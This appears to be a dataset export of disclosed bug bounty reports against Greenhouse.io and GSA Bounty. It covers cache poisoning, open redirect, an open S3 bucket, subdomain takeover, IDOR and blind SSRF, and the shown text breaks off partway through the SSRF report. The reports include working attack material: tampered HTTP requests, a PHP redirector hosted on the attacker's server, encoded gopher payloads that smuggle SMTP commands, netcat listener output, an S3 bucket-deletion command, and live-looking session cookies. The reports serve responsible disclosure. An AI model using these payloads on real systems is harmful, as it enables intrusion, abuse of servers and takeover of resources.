5  boardURI:       'https://boards.greenhouse.io/embed/job_board?for%5B%5D=twitter&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=',
6  applicationURI: 'https://boards.greenhouse.io/embed/job_app?for%5B%5D=twitter&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=',
7  baseURI:        '',
8  iFrameWidth:    650
9};
When fetching the actual correct endpoint (https://boards.greenhouse.io/embed/job_board/js?for=twitter), we see that the result for twitter is cached, returning the same corrupted URIs in the JS file. From my tests, it seems that these endpoints are cached for an unknown amount of time, with some staying in the cache for only a few minutes while others may be an hour or longer.
I also found out that the particular endpoint is on CloudFront by observing one of the IP addresses which served the file (35.164.91.227) and corroborating it with the IP range list published by AWS (https://ip-ranges.amazonaws.com/ip-ranges.json). However, fetching from different edge servers seems to result in the same mutated file being fetched at the correct endpoint (https://boards.greenhouse.io/embed/job_board/js?for=twitter). I conclude that there is a second layer of caching somewhere on the application layer.
The impact of corrupting the boardURI and applicationURI values is that the job_app or job_board iframes would fail to load in the client's website since the URI is incorrect, resulting in a denial of service for the client. One example is that Airbnb's job application page shows a Greenhouse.io error page (see attached images), which I managed to replicate it twice and lasted for about 20 minutes and less than 5 minutes respectively.
I tried to investigate if I could reliably replicate this PoC by waiting for cache to expire, as well as across several domains, but failed to find anything conclusive without knowledge of the underlying network architecture. Additionally, I am not sure if what is going on at play is due to a cache, and seeing that some IDs take quite a while to recover back to its normal state, I will stop trying to replicate the attack for now.
P.S. This is my first report, so do let me know if I could be of more help!
Impact
If the attacker has more patience and knowledge about the underlying architecture, the attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.2 attachments:F272864: airbnb_error-1.pngF272865: airbnb_error-2.pngSummary by irvinlimGreenhouse.io allows its customers to embed iframes using its provided JS SDK on https://boards.greenhouse.io/embed/job_board/js?for=twitter, for Twitter for example. (Twitter does not seem to use Greenhouse.io anymore, but their account still exists.)
I found that using parameter arrays (e.g. for[]=twitter) still loads the correct JS file, but with different URLs for the job board and application iframes. This file turns out to be cached, which I had effectively poisoned even when accessing the original URL (i.e. https://boards.greenhouse.io/embed/job_board/js?for=twitter). This results in a denial of service of the Greenhouse.io iframes that would be embedded in the customer's site, for around 20-30 minutes until the cache was cleared again.",https://hackerone.com/reports/326639,New York,United States,New York,2018,3,16,13,26
Greenhouse.io,11-50,0.0,50m-100m,$100.00,High,7.95,Open Redirect,Open Redirect in <customer>.greenhouse.io,"cyneox  submitted a report to Greenhouse.io.Feb 6th (6 years ago)Open Redirect in scout24.greenhouse.io
The Scout24 Security Team did a penetration test against scout24.greenhouse.io in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against OWASP Top 10 using industry common metholodogies. 
Reproduction steps

Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed this one)
After completing your personal information, you can upload some documents

Click Attach both under Resume/CV and Cover Letter
Upload some PDF files from your local host (in my case the file uwas called neu.pdf)


In the end you send your application by clicking on Submit Application

Using a HTTP proxy (in my case that was Burp) I was able to intercept the POST request made by the browser before being sent to the greenhouse.io API. This is some sample request:
Proof-of-Concept (PoC)
Code 1.84 KiBWrap lines Copy Download1POST /scout24/jobs/503488 HTTP/1.1
2Host: boards.greenhouse.io
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
4Accept: text/html, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
8X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
9X-Requested-With: XMLHttpRequest
10Referer: https://boards.greenhouse.io/scout24/jobs/503488
11Content-Length: 4086
12Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
13Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
14Connection: close
15
16[...]
17-----------------------------844282227400113298508475861
18Content-Disposition: form-data; name=""job_application[resume_url]""
19
20https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902660983-1663bnwl7dt-b044057e6364840cde6c41d55de3a1e1%2Fneu.pdf
21-----------------------------844282227400113298508475861
22Content-Disposition: form-data; name=""job_application[resume_url_filename]""
23
24neu.pdf
25-----------------------------844282227400113298508475861
26Content-Disposition: form-data; name=""job_application[cover_letter_url]""
27
28https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902672335-lpk5xur1na-67346266367805828242f31b3887e539%2Fneu.pdf
29-----------------------------844282227400113298508475861
30Content-Disposition: form-data; name=""job_application[cover_letter_url_filename]""
31
32neu.pdf
33-----------------------------844282227400113298508475861--
As you can notice the files have been already uploaded to AWS and therfore a S3 bucket links are
used within the requests. 
Exploitability
Using a browser and a HTTP proxy the request can be easily intercepted. In the original request the Content-Disposition parameter job_application[cover_letter_url] in the POST request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:

a phishing site
a site containing some malware

After intercepting the request, the parameter was modified like this:
Code 1.52 KiBWrap lines Copy Download1POST /scout24/jobs/503488 HTTP/1.1
2Host: boards.greenhouse.io
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
4Accept: text/html, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
8X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
9X-Requested-With: XMLHttpRequest
10Referer: https://boards.greenhouse.io/scout24/jobs/503488
11Content-Length: 4086
12Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
13Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
14Connection: close
15[...]
16
17-----------------------------844282227400113298508475861
18Content-Disposition: form-data; name=""job_application[resume_url]""
19
20https://google.com
21-----------------------------844282227400113298508475861
22Content-Disposition: form-data; name=""job_application[resume_url_filename]""
23
24neu.pdf
25-----------------------------844282227400113298508475861
26Content-Disposition: form-data; name=""job_application[cover_letter_url]""
27
28http://google.com
29-----------------------------844282227400113298508475861
30Content-Disposition: form-data; name=""job_application[cover_letter_url_filename]""
Whenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to download the file by clicking on Download (left upper corner). Although the browser shows that the URL points to some specific AWS domain, the content is actually loaded from somewhere else (in this case from https://google.com). 
Again, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like https://google.com has been chosen. 
Impact
The attack can be conducted in multiple scenarios:

anonymous person applies for some jobs and manipulates the parameters (like described above)
internal employee adds referal for some person and also manipulates the parameters

In both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:

installation of trojan horses / ransomeware (in general malicious content)
a phishing site where e.g. AD credentials are claimed to be required
CSRF (Cross-Site Request Forgery) attacks

Remediation
The affected parameter should be first validated against some regular expression (e.g. allow only links that point to grnhse-prod-jben-*.s3.amazonaws.com). 3 attachments:F157687: Selection_120.pngF157688: Selection_121.pngF157689: Selection_119.pngrongutierrez Greenhouse.io staff  posted a comment. Feb 6th (6 years ago)Hi @cyneox, 
This is a known issue and we have a fix in the works. I will let you know once it has been pushed out.rongutierrez Greenhouse.io staff  changed the status to Triaged. Feb 6th (6 years ago)cyneox   posted a comment. Feb 7th (6 years ago)HI @rongutierrez,
is this just a duplicate or did your internal staff find this issue ?!
BR,
Cyneoxrongutierrez Greenhouse.io staff  closed the report and changed the status to Resolved. May 30th (5 years ago)Hi @cyneox, 
We have released several fixes for this issue. We are now validating the file extensions of uploaded files to prevent executable extensions from being submitted (this include HTML as well). All uploaded files are run through virus scanning and will prompt the Greenhouse user if a virus was detected.  Lastly, files containing HTML markup would be handled with a text/plain content-type when downloaded so that it cannot be used for phishing.Greenhouse.io  rewarded cyneox with a $100 bounty. May 30th (5 years ago)cyneox   requested to disclose this report. Jun 8th (5 years ago)  This report has been disclosed. Jul 8th (5 years ago)",https://hackerone.com/reports/203726,New York,United States,New York,2017,2,6,9,14
Greenhouse.io,11-50,0.0,50m-100m,$100.00,Low,2.0,Improper Access Control - Generic,Open S3 Bucket Accessible by any Aws User,"kartarkat  submitted a report to Greenhouse.io.Mar 14th (3 years ago)hi team,
vulnerable URL: http://grnhse-marketing-site-assets.s3.amazonaws.com/
There is no authentication required to access the AWS bucket of the website.
As your site was associated with AWS, any AWS user can view the content , navigate through directories and download files, public access is allowed.
proof of concept: Please refer the screenshots attached.
[ note: I haven't modified any existing resources or harm any content ]
Impact
Impact

     Sensitive information Leakage.
     Information disclosure about all the data in the cloud.

I haven't tried this yet as it may delete the bucket. (it is possible)
an Attacker can delete the bucket using this command:-
$ aws s3 rb s3://<The_bucket_name>
and claim the bucket again to takeover the bucket 
solution:
secure the login access6 attachments:F747818: vulnerable_data_size.pngF747819: download_access.pngF747820: list_directory.pngF747821: bucket_source.pngF747822: navigating_through_files.pngF747823: open_bucket.png",https://hackerone.com/reports/819278,New York,United States,New York,2020,3,14,16,0
Greenhouse.io,11-50,0.0,50m-100m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Subdomain Takeover using blog.greenhouse.io pointing to Hubspot,"fransrosen  submitted a report to Greenhouse.io.Dec 1st (8 years ago)Hi,
Your subdomain blog.greenhouse.io is pointing to the service called Hubspot. However, your account at Hubspot has expired or has been cancelled. This basically means that anyone can claim your subdomain pointing to Hubspot and create their own site at this URL. This is EXTREMELY dangerous as whatever the attacker want can be placed on this domain. This is also a foolproof phishing attack since no one would be able to verify that this is not a legit greenhouse.io-login form.
I have temporarily claimed this domain for PoC. You should immediately remove the DNS-entry for blog.greenhouse.io pointing to Hubspot.
And since I'm able to run javascript at Hubspot, I'm able to do whatever I like on that domain. Creating a login form that would fool anyone, since it's present on a greenhouse.io domain.
Code 177 BytesWrap lines Copy Download1$ host blog.greenhouse.io
2blog.greenhouse.io is an alias for san.secure001.hubspot.com.edgekey.net.
3san.secure001.hubspot.com.edgekey.net is an alias for e1395.b.akamaiedge.net.
PoC-link:
http://blog.greenhouse.io/
PoC-images attached.
As you might understand, this is really bad. Foolproof phishing. XSS on greenhouse.io. Potential malware spread through a domain you - in this case - do not control. Extremely painful for the company brand.
Please make sure you're always going through your DNS-entries so no subdomains are pointing to external services you do not use.
We've written an advisory about this at Detectify:
http://blog.detectify.com/post/100600514143/hostile-subdomain-takeover-using-heroku-github-desk
Where you can read more about this sort of attack.
Regards,
Frans Rosén2 attachments:F22320: Screen_Shot_2014-12-02_at_00.23.26.pngF22321: Screen_Shot_2014-12-02_at_00.23.23.png",https://hackerone.com/reports/38007,New York,United States,New York,2014,12,1,23,27
Greenhouse.io,11-50,0.0,50m-100m,$500.00,High,7.95,Phishing,Subdomain Takeover on demo.greenhouse.io pointing to unbouncepages,"hacker2202  submitted a report to Greenhouse.io.Sep 8th (4 years ago)Actuall this report is same as of this one:- https://hackerone.com/reports/38007  
Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.
Here there is a greenhouse domain  (demo.greenhouse.io) which is pointing towards unbounce pages so  this domain can be taken over can can be used to do any type of attacks mostly i can make a fake login page on your behalf and spoof your users, this is a critical vulnerability and needs to be fixed .
Vulnerable url : demo.greenhouse.io
PoC
Snapshot of the vulnerable page(actually for taking over from unbounce i need to take a paid subscription hich is of higher cost neraly 150-200$ i cannot afford that so as a poc i m showing you a vulnerable page hoping this should work )
cname: unbouncepages.com
Name: demo.greenhouse.io
Type: CNAME
Class: IN
Impact
Impact
Risk
fake website
malicious code injection
users tricking
company impersonation
This issue can have really huge impact on the companies reputation someone could post malicious content on the compromised site and then your users will think it's official but it's not.
Remediation
Remove the cname entry or claim the subdomain demo.greenhouse.io on unbounce.com
See also
https://github.com/EdOverflow/can-i-take-over-xyz#unbounce
https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/
https://0xpatrik.com/subdomain-takeover/
https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd
http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/
Best regards,
Hacker22021 attachment:F343646: Screenshot_(476).png",https://hackerone.com/reports/407355,New York,United States,New York,2018,9,8,0,8
GSA Bounty,11-50,0.0,1m-10m,$350.00,Medium,5.45,Insecure Direct Object Reference (IDOR),[IDOR] The authenticated user can restart website build or view build logs on any another Federalist account,"sp1d3rs  submitted a report to GSA Bounty.Jul 4th (5 years ago)Description
Hi. I found an Insecure Direct Object Reference vulnerability on the http://192.168.119.128:1337/v0/build/ endpoint.
Image F200108: vv.PNG 6.19 KiBZoom in Zoom out Copy Download
When the user wants to restart the build, next request are sent to the endpoint:
Code 35 BytesWrap lines Copy Download1{""site"":<siteid>,""branch"":""master""}
where siteid is numeric ID of the site.
However, this endpoint does not check, do this site ID belongs to this user. So the any user can restart the build of the site on any other user account. So it can be classified as partial authentication bypass.
POC
I restarted the build on my localhost inscance on behalf of another user:
Image F200109: x.PNG 32.29 KiBZoom in Zoom out Copy Download
Steps to reproduce

Login to the Federalist with your test account (we call it user1).
Restart the build on one of the sites belongs to you.
Catch the request to the 

Code 37 BytesWrap lines Copy Download1http://192.168.119.128:1337/v0/build/
and change site parameter to the siteID, which was created on some other account (we call it user2).
4. Execute the request. It will be accepted.
5. Login as user2 and go to this site's builds. You will notice that build was restarted by another user.
Suggested fix
It looks like other endpoint (e.g. site settings modify) checks the site id correctly. The fix is add additional check too on this specific endpoint.2 attachments:F200108: vv.PNGF200109: x.PNGSummary by sp1d3rsThanks to the 18F team for the great experience, fast fix, and the bounty!
The report details (i requested the limited disclosure due to sensitive info in the attachments):
Description
I found an Insecure Direct Object Reference vulnerability on the /v0/build/ and /v0/build/<siteid>/log API endpoints.
For example, when the user wants to restart the build, next request is sent to the endpoint:
Code 35 Bytes1{""site"":<siteid>,""branch"":""master""}
where siteid is numeric ID of the site.
However, this endpoint does not check, do this site ID belongs to this user. So any user can restart the build of the site on any other user account.
Steps to reproduce

Login to the Federalist with your test account (we can call it user1).
Restart the build of some site which belongs to you.
Catch the request to the 

Code 31 Bytes1http://localhost:1337/v0/build/
and change site parameter to the siteID, which was created on some other account (we can call it user2).
4. Execute the request. It will be accepted and processed.
5. Login as user2 and go to the builds page. You will notice that build was restarted by another user.
Suggested fix
Correct checking of user permissions on this endpoints should fix the issue.
References
Running Federalist locally",https://hackerone.com/reports/245872,New South Wales,Australia,Sydney,2017,7,4,16,11
GSA Bounty,11-50,0.0,1m-10m,$300.00,Medium,4.9,Use of Inherently Dangerous Function,Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint,"mariuszpoplawski  submitted a report to GSA Bounty.Jun 10th (2 years ago)Summary:
Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI.
Any Class from
https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers
Can be called and any function as all of them are public.
Description:
Below we present example function call from routes. As example we present ""json_status"" function located at
https://github.com/GSA/project-open-data-dashboard/blob/f29c98267f7d843e82bfdd0f61a8272a6225aeb6/application/controllers/Campaign.php#L1048
Following URL Allow to call ""json_status"" function
Function definition is following:
Code 77 BytesWrap lines Copy Download1    public function json_status($status, $real_url = null, $component = null)
To call function parameters we have to call following URL:
https://labs.data.gov/dashboard/Campaign/json_status/$status/$real_url/$component
Example URL will call SSRF to localhost using gopher protocol:
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1/
Due to this functionality multiple actions was possible
SSRF:

Prepare malicious php file on VPS
**o.php

Code 90 BytesWrap lines Copy Download1root@vps778339:/var/www/html# cat o.php
2<?php
3$s = $_GET[""s""];
4header(""Location: "".$s);
5?>

Send request to ""json_status"" function as below described.

POC
**Request to send gopher request:
Code 1.56 KiBWrap lines Copy Download1GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
2Host: labs.data.gov
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: pl,en-US;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://labs.data.gov/
8Origin: https://labs.data.gov
9Connection: close
10Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
11Upgrade-Insecure-Requests: 1
12DNT: 1
** Netcat from server:
Code 591 BytesWrap lines Copy Download1root@vps778339:/var/www/html#
2root@vps778339:/var/www/html#
3root@vps778339:/var/www/html#
4root@vps778339:/var/www/html# nc -lvp 25
5Listening on [0.0.0.0] (family 0, port 25)
6Connection from ec2-18-213-100-122.compute-1.amazonaws.com 21688 received!
7HELO test.org%0d%0aMAIL FROM: %0d%0aRCPT TO:kontakt@deepsec.pl%0d%0aDATA%0d%0aTest%0d%0a.
8root@vps778339:/var/www/html# nc -lvp 25
9Listening on [0.0.0.0] (family 0, port 25)
10Connection from ec2-18-213-100-122.compute-1.amazonaws.com 43055 received!
11HELO test.org
12MAIL FROM:
13RCPT TO:kontakt@deepsec.pl
14DATA
15Test
16.
17root@vps778339:/var/www/html#
**Request:
Code 1.12 KiBWrap lines Copy Download1GET /dashboard/Campaign/json_status/http%3A%2F%2F51.178.47.176%2Fo.php%3Fs%3Dhttp%3A%2F%2F51.178.47.176%2Ftest HTTP/1.1
2Host: labs.data.gov
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: pl,en-US;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://labs.data.gov/
8Origin: https://labs.data.gov
9Connection: close
10Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
11Upgrade-Insecure-Requests: 1
12DNT: 1
**Part of log file:
Code 336 BytesWrap lines Copy Download1ler""
218.213.100.122 - - [10/Jun/2020:23:25:50 +0200] ""HEAD /test HTTP/1.1"" 200 200 ""-"" ""Data.gov data.json crawler""
318.213.100.122 - - [10/Jun/2020:23:25:50 +0200] ""HEAD /test HTTP/1.1"" 200 200 ""-"" ""Data.gov data.json crawler""
418.213.100.122 - - [10/Jun/2020:23:25:50 +0200] ""GET /test HTTP/1.1"" 200 205 ""-"" ""Data.gov data.json crawler""
Check if local port is OPEN due to response time or timeout and gopher protocol.
Closed  port ""4445"" scenario
Request
Code 1.08 KiBWrap lines Copy Download1GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445 HTTP/1.1
2Host: labs.data.gov
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: pl,en-US;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://labs.data.gov/
8Origin: https://labs.data.gov
9Connection: close
10Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
11Upgrade-Insecure-Requests: 1
12DNT: 1
Response time - 163 milliseconds
Code 1.10 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Wed, 10 Jun 2020 22:01:27 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: max-age=0, no-cache, no-store, must-revalidate
6Pragma: no-cache
7Expires: -1
8X-XSS-Protection: 1; mode=block
9X-Content-Type-Options: nosniff
10Access-Control-Allow-Origin: *
11Access-Control-Allow-Methods: POST, PUT, GET, DELETE, OPTIONS
12Referrer-Policy: origin
13X-Frame-Options: SAMEORIGIN
14Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
15Set-Cookie: citrix_ns_id=V6DFBFvHdbloNzsXYUzRgEDaxMQ0002; Domain=.data.gov; Path=/; Secure; HttpOnly
16Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXEw6HEe4o1Cxekp1iLlT73fDFKjSVqt3yaBcynLQLijox1_gtswdWWg5IOnZnVT6k4mONlxe5iAVstYUzN7TAFWPJFVCcQSRO0POEEN_AqFQ==&AAAAAAVNIok4r26-l3dSvg8n4ZfZJ37Wpn-ZwUcwWh_6fOAwKJnh-sw5RY6U7ywhAMLxEMiOEw7RoBUyzx7NbRfMp-zAZog_Q7azF9KsFo-jJ5nwEw==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
17Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAWlKuAUjIivKHq_TzdkV64qXJJt7Qqj8fXU71deDgdKvHiqLsiRBDS4vnmJMRxoRYyuRmTbJndfxSGMHy7pq-J_&; Domain=.data.gov; Path=/; Secure; HttpOnly
18Content-Length: 0
Open port ""443"" scenario lead to 502 gateway timeout
Request
Code 1.08 KiBWrap lines Copy Download1GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A443 HTTP/1.1
2Host: labs.data.gov
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: pl,en-US;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://labs.data.gov/
8Origin: https://labs.data.gov
9Connection: close
10Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
11Upgrade-Insecure-Requests: 1
12DNT: 1
Response
Code 1.05 KiBWrap lines Copy Download1HTTP/1.1 504 Gateway Time-out
2Date: Wed, 10 Jun 2020 21:59:23 GMT
3Content-Type: text/html
4Connection: close
5Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
6Set-Cookie: citrix_ns_id=8E6YqKIHpDnlELCEZHQGi6/DbMc0002; Domain=.data.gov; Path=/; Secure; HttpOnly
7Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXN5F16ey5zISfQ585lXQBGHlN-7dr9WKl_OFLsX_Q6Z5FSkI1y5osrgkCJi30EZN3BqgmpbDGukEtJm4GeqYoRcF1ShGz2vNsMLkPUnGJfMg==&AAAAAAXr_jOkM7gR-f7M4RoCUEgFaXqHkFZh1c2M_0VcuOMELZ4L1xjh_7Cg7-1hFJ019Co3chJ3Y6GOPx3937UBarN6bbiMCl_jnjn3xYOPDRvJ2w==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
8Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAUCRwLvsF1G93DnYnM3tfgy7WeGLO5AGxKuZ4E4g06xunWnhmGEOXaEsURmVksrMxmgclkLw2DWjtRZmysJshVE&; Domain=.data.gov; Path=/; Secure; HttpOnly
9X-Cache-Control-Orig: 
10Cache-Control: max-age=0, must-revalidate, private
11X-Expires-Orig: None
12Content-Length: 160
13
14<html>
15<head><title>504 Gateway Time-out</title></head>
16<body>
